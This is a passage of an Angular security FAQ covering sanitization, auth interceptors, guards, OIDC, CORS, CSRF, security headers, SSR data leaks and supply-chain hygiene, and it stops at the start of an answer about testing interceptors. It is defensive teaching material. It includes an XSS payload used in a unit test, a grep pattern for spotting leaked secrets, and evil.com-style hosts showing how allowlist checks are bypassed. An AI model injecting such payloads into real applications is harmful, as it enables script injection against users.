With `ngx-markdown`, keep its sanitize option on (it uses Angular's sanitizer by default). With your own `marked` setup, bind the result through `[innerHTML]` or clean it with DOMPurify. Never bypass sanitization for Markdown output.

## 156: Which URLs does Angular's URL sanitizer allow?

In current Angular versions the URL sanitizer mainly blocks `javascript:` URLs and lets everything else through: `http:`, `https:`, relative paths, `mailto:`, `tel:`, `data:` and `blob:` URLs.

Blocked URLs get the `unsafe:` prefix. Because `data:` URLs are allowed, you still need your own checks if the URL comes from users and you only want normal web links.

## 157: Why does the content look different after Angular sanitizes innerHTML?

Angular's HTML sanitizer keeps only an allowlist of elements and attributes. It removes `<script>`, `<style>`, `<iframe>`, `<object>`, event handler attributes like `onclick`, inline `style` attributes and unsafe URLs. In dev mode you'll see "WARNING: sanitizing HTML stripped some content".

If designers complain that colors or layouts are gone, move styling into CSS classes in your component instead of turning off sanitization.

## 158: What do NG0904 and NG0910 errors mean?

- **NG0904**: an unsafe value was used in a resource URL context, for example `[src]` on an `<iframe>` with a plain string. You must build the URL yourself and trust it explicitly if it's really safe.
- **NG0910**: you tried to bind a security-sensitive iframe attribute, like `sandbox`, `allow` or `csp`, with a dynamic binding. Angular requires these to be static in the template, so an attacker can't loosen the sandbox through data.

```html
<!-- Correct: static sandbox, trusted src -->
<iframe [src]="trustedUrl" sandbox="allow-scripts"></iframe>
```

## 159: In what order do functional interceptors run?

In the order you list them in `withInterceptors`. For the request, the first one runs first. For the response, the order is reversed, since each interceptor wraps the next.

```ts
provideHttpClient(
  withInterceptors([loggingInterceptor, authInterceptor, errorInterceptor]),
);
```

So if the auth interceptor should see the final request after other changes, place it later in the list. Put a retry or refresh interceptor before the auth one if it needs to re-run the auth step on retried requests.

## 160: How do class-based interceptors fit into modern Angular?

Old interceptors implement `HttpInterceptor` and are registered with the `HTTP_INTERCEPTORS` multi-provider. In a standalone app they only run if you add `withInterceptorsFromDi()`:

```ts
provideHttpClient(
  withInterceptors([authInterceptor]),
  withInterceptorsFromDi(),
);
```

Functional interceptors are the recommended style now. You'll still find class interceptors in older apps and some libraries, and the Angular docs suggest moving away from them.

## 161: How does a 401 refresh flow work in an interceptor?

1. Send the request with the current access token.
2. If the response is 401, call the refresh endpoint to get a new access token.
3. Retry the original request with the new token.
4. If the refresh fails, log the user out.

```ts
export const refreshInterceptor: HttpInterceptorFn = (req, next) => {
  const auth = inject(AuthService);
  return next(req).pipe(
    catchError((err) => {
      if (err.status !== 401 || req.context.get(SKIP_REFRESH))
        return throwError(() => err);
      return auth.refresh().pipe(
        switchMap((token) =>
          next(req.clone({ setHeaders: { Authorization: `Bearer ${token}` } })),
        ),
        catchError((refreshErr) => {
          auth.logout();
          return throwError(() => refreshErr);
        }),
      );
    }),
  );
};
```

## 162: How do you stop an interceptor from causing an endless refresh loop?

Mark the refresh request so the interceptor ignores it, and never try to refresh more than once for the same request. If the refresh call itself returns 401, the user must log in again.

Use an `HttpContextToken` for the marker rather than checking URLs by string, so the logic doesn't break when endpoints change.

## 163: What is HttpContextToken and how is it useful for auth?

`HttpContextToken` lets you attach metadata to a single request that interceptors can read. It's not sent to the server.

```ts
export const SKIP_AUTH = new HttpContextToken<boolean>(() => false);

this.http.get("/api/public/config", {
  context: new HttpContext().set(SKIP_AUTH, true),
});

export const authInterceptor: HttpInterceptorFn = (req, next) =>
  req.context.get(SKIP_AUTH) ? next(req) : next(addToken(req));
```

It's a clean way to say "don't add the token" or "don't try to refresh" for specific calls.

## 164: How do you attach different tokens for different APIs?

Keep a map of allowed API origins to token scopes, match the request URL against it, and add the token only on a match:

```ts
const apiScopes: Record<string, string> = {
  "https://api.example.com": "api://main/.default",
  "https://files.example.com": "api://files/.default",
};

export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const origin = new URL(req.url, location.origin).origin;
  const scope = apiScopes[origin];
  if (!scope) return next(req);
  return inject(AuthService)
    .getToken(scope)
    .pipe(
      switchMap((token) =>
        next(req.clone({ setHeaders: { Authorization: `Bearer ${token}` } })),
      ),
    );
};
```

Compare the full origin, not `url.includes('example.com')`, which would also match `example.com.evil.net`.

## 165: How should an Angular app handle a 403 response globally?

Don't refresh the token and don't log the user out; the user is logged in but isn't allowed. Show an "access denied" message or route to a 403 page, and keep the user's data.

```ts
catchError((err) => {
  if (err.status === 403) inject(Router).navigate(["/forbidden"]);
  return throwError(() => err);
});
```

Also check that the UI didn't offer the action in the first place, since a 403 often means the UI and server permissions are out of sync.

## 166: Why should a guard wait for auth initialization?

On page refresh, the app may need time to restore the session (call `/me`, refresh the token, process the OIDC callback). If the guard checks `isLoggedIn()` before that finishes, it redirects logged-in users to login.

Make the guard wait for initialization:

```ts
export const authGuard: CanActivateFn = () => {
  const auth = inject(AuthService);
  const router = inject(Router);
  return toObservable(auth.ready).pipe(
    filter(Boolean),
    take(1),
    map(() => auth.isLoggedIn() || router.parseUrl("/login")),
  );
};
```

You can also do this with `provideAppInitializer` so the session is restored before the first navigation.

## 167: What is canActivateChild used for?

It runs before any child route of a parent is activated. It saves you from adding the same guard to every child:

```ts
{
  path: 'admin',
  canActivateChild: [adminGuard],
  children: [
    { path: 'users', component: Users },
    { path: 'settings', component: Settings },
  ],
}
```

It also runs when moving between children, unlike `canActivate` on the parent, which doesn't re-run in that case.

## 168: How do you write a role guard using route data?

Put the required roles in the route's `data` and read them in the guard:

```ts
export const roleGuard: CanActivateFn = (route) => {
  const required = route.data['roles'] as string[];
  const auth = inject(AuthService);
  return required.some((r) => auth.hasRole(r)) || inject(Router).parseUrl('/forbidden');
};

{ path: 'reports', component: Reports, canActivate: [roleGuard], data: { roles: ['manager', 'admin'] } }
```

The same roles must be checked again on the server for the APIs the reports page calls.

## 169: Does CanMatchFn stop a user from getting a lazy-loaded chunk's code?

It stops the router from loading the chunk, but the chunk is still a public file on your server or CDN. A user can find its file name in the main bundle and download it directly.

So `canMatch` is good for performance and a cleaner UI, not for hiding code. Admin-only code must not contain secrets, and the admin APIs must be protected on the server.

## 170: Why doesn't CanDeactivate stop the user from closing the tab?

`CanDeactivate` only runs for in-app router navigation. Closing the tab, reloading or typing a new URL doesn't go through the Angular router.

For those cases, add a `beforeunload` listener, which shows the browser's own "leave site?" dialog:

```ts
@HostListener('window:beforeunload', ['$event'])
onBeforeUnload(e: BeforeUnloadEvent) {
  if (this.isDirty()) e.preventDefault();
}
```

## 171: How should a resolver behave when the API returns 403?

Don't leave the user on a half-loaded page. Catch the error and redirect, for example by returning a `RedirectCommand`:

```ts
export const orderResolver: ResolveFn<Order> = (route) => {
  const router = inject(Router);
  return inject(OrderService)
    .get(route.paramMap.get("id")!)
    .pipe(
      catchError(() => of(new RedirectCommand(router.parseUrl("/forbidden")))),
    );
};
```

A resolver that fails silently can show stale data from a previous page, which is confusing and can show the wrong user's data on a shared screen.

## 172: What is RedirectCommand?

`RedirectCommand` is a return value for guards and resolvers that redirects with extra navigation options:

```ts
return new RedirectCommand(router.parseUrl("/login"), {
  skipLocationChange: true,
});
```

With a plain `UrlTree` you can't pass options like `skipLocationChange` or `replaceUrl`. It was added in Angular 18.

## 173: How do you set up angular-oauth2-oidc with code flow and PKCE in a standalone app?

```ts
bootstrapApplication(App, {
  providers: [
    provideHttpClient(),
    provideOAuthClient({
      resourceServer: {
        allowedUrls: ["https://api.example.com"],
        sendAccessToken: true,
      },
    }),
  ],
});

// In an initializer or root component
oauthService.configure({
  issuer: "https://login.example.com/realms/app",
  clientId: "angular-spa",
  redirectUri: window.location.origin + "/callback",
  responseType: "code",
  scope: "openid profile offline_access api",
});
await oauthService.loadDiscoveryDocumentAndTryLogin();
```

`responseType: 'code'` turns on the code flow, and PKCE is used automatically with it. `allowedUrls` limits which requests get the token.

## 174: What is the difference between silent refresh with an iframe and refresh tokens?

- **Silent refresh**: the app opens a hidden iframe to the identity provider, which uses the provider's session cookie to issue new tokens. Modern browsers block third-party cookies, so this often fails when the provider is on another domain.
- **Refresh tokens**: the app uses a refresh token to get new access tokens directly. For SPAs, refresh tokens should rotate (each use gives a new one and invalidates the old) and have a limited lifetime.

Most current setups use rotating refresh tokens or a BFF instead of iframe-based silent refresh.

## 175: How do you configure MSAL Angular to add tokens only for specific APIs?

Use `MsalInterceptor` with a `protectedResourceMap`:

```ts
{
  provide: MSAL_INTERCEPTOR_CONFIG,
  useFactory: (): MsalInterceptorConfiguration => ({
    interactionType: InteractionType.Redirect,
    protectedResourceMap: new Map([
      ['https://graph.microsoft.com/v1.0/me', ['user.read']],
      ['https://api.example.com/', ['api://my-api/access']],
    ]),
  }),
}
```

Requests to URLs not in the map get no token. Keep the map tight; don't map `*` or very broad patterns.

## 176: Should you use popup or redirect login with MSAL or other OIDC libraries?

Redirect is usually more reliable: popups can be blocked, and some browsers and in-app web views handle them poorly. Redirect also avoids passing messages between windows.

Popup is useful when you don't want to lose the app state. Either way, the security is similar, since both use the code flow with PKCE. Pick one interaction type and handle it consistently in guards and interceptors.

## 177: What should the client check in tokens, and what can it skip?

A good OIDC library checks the ID token: `iss` (issuer), `aud` (your client ID), `exp`, `nonce`, and the signature if it has the keys. You shouldn't write that yourself.

The client should not try to validate the access token. It's meant for the API, its format can be opaque, and only the API's validation counts. The client just sends it and handles 401s.

## 178: How do you check if a JWT is expired on the client?

Decode the payload and compare `exp` (seconds since 1970) to the current time, with a small margin for clock differences:

```ts
function isExpired(token: string, skewSeconds = 30): boolean {
  const payload = JSON.parse(
    atob(token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/")),
  );
  return payload.exp * 1000 < Date.now() + skewSeconds * 1000;
}
```

Use this only to refresh early and avoid needless 401s. The server's check is the one that matters, and user clocks can be wrong.

## 179: What is refresh token rotation?

Every time the app uses a refresh token, the server gives back a new refresh token and invalidates the old one. If an attacker steals a refresh token and uses it, the real app's next refresh fails (or the server sees reuse) and can kill the whole session.

This makes refresh tokens in the browser much less dangerous. Most identity providers support it for SPAs.

## 180: How do you change where angular-oauth2-oidc stores tokens?

The library uses `sessionStorage` by default. You can provide a different `OAuthStorage`:

```ts
export function storageFactory(): OAuthStorage {
  return localStorage;
}

providers: [{ provide: OAuthStorage, useFactory: storageFactory }];
```

You can also write an in-memory storage class that implements `getItem`, `setItem` and `removeItem`. Memory is the safest against XSS token theft, but the user may need to log in again after refresh unless the provider session allows a silent login.

## 181: How do you work with cookie-based sessions in Angular?

The server sets an httpOnly, Secure, SameSite session cookie at login. The Angular app doesn't touch it; the browser sends it automatically.

- For same-origin APIs, nothing special is needed. Keep the XSRF protection on.
- For a different origin, set `withCredentials: true` and have the server allow your origin with credentials.

The app still needs a way to know who's logged in, usually by calling an endpoint like `/api/me` at startup.

## 182: If cookies are SameSite=Lax, do you still need CSRF tokens?

SameSite=Lax blocks cookies on most cross-site `POST` requests, which stops most classic CSRF. But there are gaps:

- `GET` requests that change data still get the cookie on top-level navigation.
- Sibling subdomains count as "same site", so a hacked `blog.example.com` can attack `app.example.com`.
- Older browsers may not support SameSite.

So a CSRF token or a custom header check is still a good extra layer, especially for important actions.

## 183: How do you protect a cross-origin cookie-based API from CSRF?

Angular's XSRF interceptor won't add the header to cross-origin requests. Options:

- Require a custom header (like `X-Requested-With`) and allow it only for your origin through CORS. Cross-site forms can't send custom headers without a preflight that your CORS rules reject.
- Have the API return a CSRF token in a response body and send it back in a header from a custom interceptor.
- Put the API on the same site, for example behind a reverse proxy at `/api`.

The last option is often the simplest.

## 184: What is a CORS preflight request?

Before some cross-origin requests, the browser sends an `OPTIONS` request to ask the server if the real request is allowed. It happens when you use methods other than `GET`/`HEAD`/`POST`, custom headers like `Authorization`, or content types like `application/json`.

The server must answer with matching `Access-Control-Allow-*` headers. If it doesn't, the browser never sends the real request. That's why adding an auth header to a cross-origin request often starts a "CORS error" debugging session.

## 185: Why can't a server use Access-Control-Allow-Origin: * with credentials?

The browser refuses to share responses for credentialed requests (cookies, HTTP auth) when the allowed origin is `*`. This stops any website from reading a logged-in user's data through your API.

The server must reply with the exact origin, for example `Access-Control-Allow-Origin: https://app.example.com`, plus `Access-Control-Allow-Credentials: true`.

## 186: Why is reflecting the Origin header in CORS dangerous?

Some servers "fix" CORS by copying whatever `Origin` header comes in into `Access-Control-Allow-Origin` and also allowing credentials. That means any website can make requests with the user's cookies and read the responses, which is like having no same-origin policy at all.

The server must compare the origin to a fixed allowlist. As an Angular developer you should push back if the back-end team suggests this.

## 187: How do you make a JSONP request in Angular, and when is it acceptable?

```ts
provideHttpClient(withJsonpSupport());

this.http.jsonp<Weather>(
  "https://legacy.example.com/weather?city=Berlin",
  "callback",
);
```

It's only acceptable for a trusted provider that doesn't support CORS, for public data, and when you accept that their response runs as code in your app. Also, a strict CSP will block it unless you allow that script origin.

## 188: Does withFetch change anything about security?

`withFetch()` makes `HttpClient` use the `fetch` API instead of `XMLHttpRequest`. Interceptors, the XSRF interceptor and `withCredentials` still work the same way.

The main differences are in things like upload progress events and some caching details, not in security. Your CSP's `connect-src` applies to both.

## 189: How do you handle a redirect to an external URL safely?

Keep an allowlist of hosts and parse the URL before using it:

```ts
const allowedHosts = new Set(["docs.example.com", "help.example.com"]);

function safeExternalRedirect(target: string) {
  try {
    const url = new URL(target);
    if (url.protocol === "https:" && allowedHosts.has(url.hostname)) {
      window.location.assign(url.href);
      return;
    }
  } catch {}
  window.location.assign("/");
}
```

Don't use `startsWith('https://docs.example.com')`, since `https://docs.example.com.evil.net` passes that check.

## 190: What does router.navigateByUrl do with a full external URL?

The Angular router only navigates inside the app. If you pass `https://evil.com`, it's treated as a path in your app and usually ends in a "no route matched" error or your wildcard route.

That makes `navigateByUrl` safer than `window.location.href` for return URLs, but you should still validate them, because a path like `//evil.com` can be handled differently by other code.

## 191: How do OIDC libraries remember where to send the user after login?

They keep it in the `state` or in browser storage before redirecting to the identity provider, then read it back after the callback. In `angular-oauth2-oidc` you can pass extra state to `initCodeFlow()`; in MSAL there's a `state` field in the request.

Whatever you store, validate it as an in-app path before navigating, the same as any `returnUrl`.

## 192: How do you write a custom validator in Angular forms?

A validator is a function that takes a control and returns `null` if valid or an error object:

```ts
export function noAngleBrackets(
  control: AbstractControl,
): ValidationErrors | null {
  return /[<>]/.test(control.value ?? "") ? { angleBrackets: true } : null;
}

name = new FormControl("", [Validators.required, noAngleBrackets]);
```

This can improve data quality, but it isn't an XSS defense. Escaping on output is what stops XSS, and the server must repeat the validation.

## 193: How can an async validator leak information?

A validator that calls `/api/users/exists?email=...` to say "email already taken" lets anyone check which emails have accounts. Attackers can use it to build lists of users.

If that matters for your product, the server should rate limit the endpoint, and you can change the flow, for example by always saying "check your email" on sign-up.

## 194: How should you validate file uploads in Angular?

Check the type and size on the client for good feedback:

```html
<input type="file" accept="image/png,image/jpeg" (change)="onFile($event)" />
```

```ts
onFile(e: Event) {
  const file = (e.target as HTMLInputElement).files?.[0];
  if (!file || file.size > 5 * 1024 * 1024 || !['image/png', 'image/jpeg'].includes(file.type)) {
    this.error.set('Only PNG or JPEG up to 5 MB');
    return;
  }
}
```

`file.type` comes from the file extension and can be faked. The server must check size, real content type and scan the file.

## 195: Why are user-uploaded SVG files dangerous?

SVG is XML that can contain `<script>` and event handlers. If you serve an uploaded SVG from your own domain and someone opens it directly, the script runs on your origin.

Showing it through an `<img src>` doesn't run scripts, but the file URL itself is still dangerous. Serve user uploads from a separate domain, with `Content-Disposition: attachment` or a strict CSP, or convert SVGs to PNG.

## 196: How do you download a file from an API safely in Angular?

Request it as a blob and create a temporary object URL:

```ts
this.http.get("/api/reports/42", { responseType: "blob" }).subscribe((blob) => {
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "report.pdf";
  a.click();
  URL.revokeObjectURL(url);
});
```

This keeps the auth token in the header instead of putting it in a download URL. Set a fixed file name or sanitize the one from the server.

## 197: How do you handle output from a rich text editor like Quill or TinyMCE?

Treat it as untrusted HTML. Editors only control what normal users type through the UI; an attacker can send any HTML straight to your API.

Sanitize on the server when saving (with an HTML sanitizer library), and render with `[innerHTML]` on the client so Angular sanitizes it again. Don't bypass sanitization to "keep the formatting"; allow what you need through the server-side sanitizer config and CSS classes.

## 198: How is Angular's sanitizer different from DOMPurify?

Angular's sanitizer is built in, runs automatically on bindings and uses a fixed, fairly strict allowlist. You can't configure it.

DOMPurify is a separate library that is more configurable (allow certain tags, attributes or URI schemes, hooks) and handles things like SVG and MathML. Teams use DOMPurify when they need more control, and Angular's sanitizer for everything else.

## 199: How do you load a third-party script dynamically and keep it safe?

Create the script element with a fixed, trusted URL, add SRI if the file is versioned, and make sure your CSP allows it:

```ts
const doc = inject(DOCUMENT);
const script = doc.createElement("script");
script.src = "https://js.example-payments.com/v3/sdk.js";
script.integrity = "sha384-...";
script.crossOrigin = "anonymous";
doc.head.appendChild(script);
```

Never build the script URL from user input or config that users can change. Also check if the vendor publishes an npm package you can bundle instead.

## 200: What are the risks of Google Tag Manager or similar tag tools?

Tag managers let non-developers add scripts to the live site without a code review or deploy. If an account is compromised or someone adds a bad tag, that script runs with full access to your app, including forms and tokens.

They also make strict CSP hard. Limit who can publish tags, avoid using them on sensitive pages like login and payments, and keep CSP rules as tight as you can.

## 201: Why can't you use SRI with Google Fonts CSS?

The Google Fonts CSS file changes based on the browser that requests it (different font formats and URLs), and Google can update it at any time. A fixed hash would break.

If you want SRI and strict CSP, self-host the fonts: download them, put them in your `public` folder and reference them from your own CSS.

## 202: Why does SRI need the crossorigin attribute?

To check the hash, the browser has to read the content of the file. For a cross-origin file, it can only do that through a CORS request. `crossorigin="anonymous"` makes the browser request the file with CORS and without cookies.

The CDN must reply with `Access-Control-Allow-Origin`. If it doesn't, the browser blocks the file.

## 203: Is a runtime config.json safer than environment.ts for secrets?

No. Loading config from `/assets/config.json` at startup is useful so one build can run in many environments, but the file is still downloaded by the browser and anyone can read it.

The rule is the same: only public values. If something must stay secret, the browser must never receive it.

## 204: How can you check your production bundle for leaked secrets?

Search the build output before deploying:

```bash
ng build
grep -rEi "secret|password|api[_-]?key|BEGIN PRIVATE KEY" dist/
```

Better, run a secret scanner like `gitleaks` or `trufflehog` on the repo and the `dist` folder in CI. If you find a real secret, moving it out of the code isn't enough; rotate it, because it was already exposed.

## 205: What does the define option in the Angular build do, and is it safe for secrets?

The `define` option in `angular.json` (and `--define` on the command line) replaces a global identifier with a constant value at build time:

```json
"define": { "BUILD_VERSION": "'1.4.2'" }
```

It's handy for version numbers or feature flags. The value is written straight into the bundle, so it's just as public as `environment.ts`. Don't use it for secrets.

## 206: How do you use hidden source maps with an error tracking tool?

Turn on hidden source maps in the production config:

```json
"sourceMap": { "scripts": true, "styles": false, "hidden": true }
```

The build creates `.map` files but doesn't add the `//# sourceMappingURL` comment to the bundles. Upload the maps to your error tool (for example with the Sentry CLI) during CI, then delete them from `dist` before deploying so they aren't publicly served.

## 207: A secret was committed to git and then removed. Is it safe now?

No. It's still in the git history, and anyone who cloned or forked the repo may have it. Bots also scan public repos for secrets within minutes.

Rotate the secret right away. Cleaning the history (with `git filter-repo` or BFG) is a good extra step, but rotation is the real fix.

## 208: Why prefer frame-ancestors over X-Frame-Options?

`frame-ancestors` is part of CSP and is more flexible. You can allow a list of origins:

```
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com
```

`X-Frame-Options` only supports `DENY` and `SAMEORIGIN` reliably. Its `ALLOW-FROM` value was never well supported and modern browsers ignore it. Many sites send both for older browsers; when both are present, modern browsers use `frame-ancestors`.

## 209: Is JavaScript frame-busting a good clickjacking defense?

Not really. Code like `if (top !== self) top.location = self.location` can be blocked by the attacker using the `sandbox` attribute on their iframe, or broken in other ways.

Use the `frame-ancestors` and `X-Frame-Options` headers instead. They're enforced by the browser before your code runs.

## 210: What should you know before enabling HSTS preload?

Preloading puts your domain on a list built into browsers, so HTTPS is used from the very first visit. To be accepted you need `max-age` of at least a year, `includeSubDomains` and `preload`:

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

It's hard to undo: removal takes months. Make sure every subdomain, including internal tools and old services, works over HTTPS before you submit.

## 211: What is mixed content?

Mixed content is when an HTTPS page loads resources over plain HTTP, like images, scripts or API calls. Browsers block mixed scripts and API calls ("active" mixed content) and upgrade or warn about images.

In Angular apps it usually shows up as an `http://` API URL in an environment file. Use `https://` everywhere, or relative URLs. The CSP directive `upgrade-insecure-requests` can also help with old content.

## 212: How do you add security headers to ng serve during development?

Use the `headers` option of the dev server in `angular.json`:

```json
"serve": {
  "builder": "@angular/build:dev-server",
  "options": {
    "headers": {
      "Content-Security-Policy": "trusted-types angular angular#bundler; require-trusted-types-for 'script'",
      "X-Frame-Options": "DENY"
    }
  }
}
```

Testing with the same CSP and Trusted Types rules you use in production catches problems early, instead of after deploy.

## 213: Where do you set security headers for a static Angular app?

Wherever the app is served, since an Angular build is just static files:

- **nginx**: `add_header` in the server block.
- **Netlify**: a `_headers` file or `netlify.toml`.
- **Firebase Hosting**: the `headers` section in `firebase.json`.
- **Vercel**: `vercel.json`.
- **CloudFront**: a response headers policy.

```nginx
add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-ancestors 'self'" always;
add_header X-Content-Type-Options "nosniff" always;
```

## 214: How do you add security headers in an Angular SSR server?

Add middleware in `server.ts`. With Express, `helmet` is a common choice:

```ts
import helmet from "helmet";

const app = express();
app.use(
  helmet({
    contentSecurityPolicy: false, // set your own CSP that matches your nonce setup
    frameguard: { action: "deny" },
  }),
);
```

Make sure the headers also apply to the HTML responses rendered by Angular, not only to static files.

## 215: How do you use npm audit in CI without blocking on noise?

Focus on what ships to users and on serious issues:

```bash
npm audit --omit=dev --audit-level=high
```

`--omit=dev` skips dev dependencies like test tools, and `--audit-level=high` fails only on high and critical issues. Still review the dev-dependency findings from time to time, because build tools run on your CI machines.

## 216: What do Dependabot and Renovate do?

They watch your dependencies and open pull requests when new versions or security fixes come out. Dependabot is built into GitHub; Renovate works on many platforms and is more configurable.

For Angular, group the `@angular/*` packages in one PR, because they must stay on the same version. Major Angular upgrades are still best done with `ng update` so migrations run.

## 217: How do you fix a vulnerable transitive dependency?

First, try updating the direct dependency that pulls it in. If there's no fixed version yet, use `overrides` in `package.json` to force a safe version:

```json
"overrides": {
  "some-vulnerable-lib": "^2.3.1"
}
```

Run your tests after, since forcing a version the parent package didn't expect can break it. Remove the override once the parent package is updated.

## 218: Why are npm install scripts a risk?

Packages can run `preinstall`, `install` and `postinstall` scripts on your machine or CI when you install them. A malicious or hijacked package can use them to steal environment variables, tokens and SSH keys.

You can run `npm ci --ignore-scripts` in CI when your build allows it, use newer package managers that block install scripts by default (pnpm v10 does), and keep CI secrets away from the install step.

## 219: How long is an Angular version supported?

Each major version gets about 6 months of active support and then 12 months of long-term support (LTS), so 18 months in total. During LTS, only critical fixes and security patches are released.

After that, there are no security fixes. Check the support table on angular.dev/reference/releases and plan upgrades before your version drops out.

## 220: How do you add a Web Worker to an Angular app and keep it secure?

Generate it with the CLI:

```bash
ng generate web-worker heavy-calc
```

```ts
const worker = new Worker(new URL("./heavy-calc.worker", import.meta.url));
worker.postMessage({ numbers });
worker.onmessage = ({ data }) => this.result.set(data);
```

The worker file is bundled with your app, so it comes from your own origin. Your CSP needs `worker-src 'self'` (or `script-src 'self'` as the fallback). Validate messages in both directions and don't load worker code from user-provided URLs.

## 221: How do you validate the content of postMessage data?

Check the origin first, then check the shape of the data before using it:

```ts
window.addEventListener("message", (event) => {
  if (event.origin !== "https://widget.example.com") return;
  const data = event.data;
  if (typeof data !== "object" || data === null || data.type !== "resize")
    return;
  if (typeof data.height !== "number" || data.height < 0 || data.height > 5000)
    return;
  this.iframeHeight.set(data.height);
});
```

Never pass message data to `innerHTML`, `eval`, `location` or `bypassSecurityTrust*`.

## 222: What is MessageChannel and why is it safer than window.postMessage for iframes?

`MessageChannel` creates a pair of connected ports. You send one port to the iframe once (checking the origin), and after that both sides talk only through the ports.

```ts
const channel = new MessageChannel();
iframe.contentWindow!.postMessage(
  { type: "init" },
  "https://widget.example.com",
  [channel.port2],
);
channel.port1.onmessage = (e) => handle(e.data);
```

Other windows can't send messages into that private channel, so you don't need to recheck the origin on every message.

## 223: How do you sync logout across browser tabs?

Use `BroadcastChannel` (or the `storage` event if you store a flag in `localStorage`):

```ts
const channel = new BroadcastChannel('auth');

logout() {
  this.clearSession();
  channel.postMessage('logout');
}

channel.onmessage = (e) => {
  if (e.data === 'logout') this.clearSession();
};
```

Without this, a user who logs out in one tab may still see private data in another tab.

## 224: How do you keep the client session timer in sync with the server?

Don't guess the timeout on the client. Have the server tell you when the session or token expires, for example from the token's `exp` or an `expiresAt` field from `/api/me`.

Update the timer every time the session is extended, and when the warning dialog shows, make "stay logged in" call the server to extend the session. If the API returns 401, treat that as the final answer regardless of the local timer.

## 225: How do you log out properly with an OIDC provider?

Call the provider's end session endpoint, usually with `id_token_hint` and `post_logout_redirect_uri`:

```ts
// angular-oauth2-oidc
this.oauthService.logOut();

// MSAL
this.msalService.logoutRedirect({ postLogoutRedirectUri: "/" });
```

If you only clear local tokens, the provider's session cookie is still there and the next "login" click logs the user straight back in, which is a problem on shared computers. The post-logout redirect URI must be registered with the provider.

## 226: How do you clear app state on logout in an NgRx app?

Use a meta-reducer that resets the state when a logout action happens:

```ts
export function clearOnLogout(
  reducer: ActionReducer<AppState>,
): ActionReducer<AppState> {
  return (state, action) =>
    reducer(action.type === logout.type ? undefined : state, action);
}

provideStore(reducers, { metaReducers: [clearOnLogout] });
```

Also clear signal-based stores and services that cache user data. A full page reload after logout is the simplest way to be sure nothing stays in memory.

## 227: Does Angular's HTTP transfer cache store requests that have an Authorization header?

By default, no. During SSR, the transfer cache skips requests with `Authorization` or `Proxy-Authorization` headers, so those responses aren't written into the HTML. You can change this with `includeRequestsWithAuthHeaders` in `withHttpTransferCacheOptions`, but think hard before you do.

```ts
provideClientHydration(
  withHttpTransferCacheOptions({ includePostRequests: false }),
);
```

Requests authenticated with cookies don't have an `Authorization` header, so their responses can still be cached into the page. Use the `filter` option to exclude private endpoints.

## 228: How do you exclude specific requests from the SSR transfer cache?

Use the `filter` option, or turn off caching per request with the `transferCache` option on the request:

```ts
provideClientHydration(
  withHttpTransferCacheOptions({
    filter: (req) => !req.url.includes("/api/account"),
  }),
);

this.http.get("/api/account/profile", { transferCache: false });
```

Private data then won't end up in the serialized state in the HTML.

## 229: How can state leak between users in Angular SSR?

The Node process handles many requests. If you keep user data in module-level variables, or in services provided in a way that outlives a single request, one user's data can show up in another user's page.

Angular creates a new app and injector per request, so root services are per request. The risk is mostly in plain module variables, caches in `server.ts`, or third-party libraries with global state.

## 230: How do you forward the user's cookies to your API during SSR?

Inject the `REQUEST` token from `@angular/core` and copy the cookie header in an interceptor, but only for your own API:

```ts
export const ssrCookieInterceptor: HttpInterceptorFn = (req, next) => {
  const request = inject(REQUEST, { optional: true });
  const cookie = request?.headers.get("cookie");
  if (!cookie || !req.url.startsWith("https://api.example.com/"))
    return next(req);
  return next(req.clone({ setHeaders: { cookie } }));
};
```

Never forward the user's cookies to third-party URLs. And remember that anything rendered with them goes into the HTML for that user only, so don't cache it in a shared CDN cache.

## 231: Is Angular's escaping also active during SSR?

Yes. On the server, Angular renders with the same compiled templates and the same sanitization, so `{{ }}` is escaped and `[innerHTML]` is sanitized when the HTML string is produced.

Problems come from code outside Angular's rendering, for example `server.ts` building HTML with string templates, or putting values into the `index.html` shell yourself.

## 232: What is the risk of prerendering (SSG) pages that depend on the user?

Prerendered pages are built once and served to everyone. If a page renders user-specific data at build time or during prerender with a logged-in session, every visitor gets that HTML.

Prerender only public pages. For user pages, use SSR per request or render that part on the client. In route config you can set `RenderMode.Client` or `RenderMode.Server` for those routes.

## 233: How should user content be used with $localize?

Pass user data as placeholders, not as part of the message text:

```ts
const msg = $localize`Hello, ${userName}:name:!`;
```

The message ID and translation are fixed at build time, and `userName` is just a value. Then render `msg` with interpolation. Never build translation keys or message text from user input.

## 234: What is ICU message injection?

When ICU messages are parsed at runtime (for example with `intl-messageformat` or a runtime translation library) and you build the message string by joining in user text, the user can add ICU syntax like `{`, `}` or `#`. That can break the message, change the output, or call formatting in ways you didn't expect.

```ts
// Bad: user text becomes part of the ICU pattern
format(
  `Hello ${userName}, you have {count, plural, one {# item} other {# items}}`,
);

// Good: user text is an argument
format("Hello {name}, you have {count, plural, one {# item} other {# items}}", {
  name: userName,
  count,
});
```

## 235: What is the risk of HTML in ngx-translate translations?

Some apps put HTML in translation files and render it with `[innerHTML]="'KEY' | translate"`. If translations come from a third-party service or untrusted translators, they can add links or markup that changes the page.

Angular's sanitizer still blocks scripts, but phishing links and fake content get through. Keep HTML out of translations when you can, review translation changes like code, and pass user values as parameters, never concatenated into the key or text.

## 236: How do you test that a component doesn't render injected HTML?

Render it with a malicious value and check the DOM:

```ts
it("escapes the user name", () => {
  const fixture = TestBed.createComponent(UserCard);
  fixture.componentRef.setInput("name", "<img src=x onerror=alert(1)>");
  fixture.detectChanges();

  const el: HTMLElement = fixture.nativeElement;
  expect(el.querySelector("img")).toBeNull();
  expect(el.textContent).toContain("<img src=x onerror=alert(1)>");
});
```

Tests like this catch regressions when someone later changes the template to use `[innerHTML]` or a bypass pipe.

## 237: How do you unit test a functional guard?

Run it inside an injection context with mocked services:

```ts
it("redirects anonymous users to login", () => {
  TestBed.configureTestingModule({
    providers: [
      { provide: AuthService, useValue: { isLoggedIn: () => false } },
    ],
  });

  const result = TestBed.runInInjectionContext(() =>
    authGuard(
      {} as ActivatedRouteSnapshot,
      { url: "/admin" } as RouterStateSnapshot,
    ),
  );

  expect(TestBed.inject(Router).serializeUrl(result as UrlTree)).toBe("/login");
});
```

You can also use `RouterTestingHarness` to test the guard together with real routes.

## 238: How do you unit test an auth interceptor?

Register it with `provideHttpClient` and use `HttpTestingController`:

```ts
